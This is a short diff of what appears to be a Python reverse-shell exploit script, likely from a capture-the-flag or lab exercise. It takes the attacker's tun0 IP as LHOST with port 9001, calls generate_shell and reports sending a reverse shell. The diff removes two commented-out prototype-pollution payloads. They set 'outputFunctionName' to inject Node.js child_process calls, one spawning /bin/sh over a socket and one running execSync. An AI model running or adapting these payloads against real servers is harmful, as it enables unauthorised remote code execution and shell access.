@@ -79,21 +79,6 @@ def main():
   LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
   LPORT = 9001
 
-  # payload["connection"]["settings"]["__proto__"] = {
-  #   "outputFunctionName": ("x = 1;"
-  #   "cp = process.mainModule.require(\'child_process\');"
-  #   "sh = cp.spawn('/bin/sh', []);"
-  #   "var client = new process.mainModule.net.Socket();"
-  #   "console.log(\'hellotest11\')"
-  #   "; var y")
-  # }
-
-  # payload["connection"]["settings"]["__proto__"] = {
-  #   "outputFunctionName": ("x = 1;"
-  #   "console.log(process.mainModule.require('child_process').execSync('pwd').toString())"
-  #   "; var y")
-  # }
-
   generate_shell(LHOST, LPORT)
 
   print("[+]Sending reverse shell!")
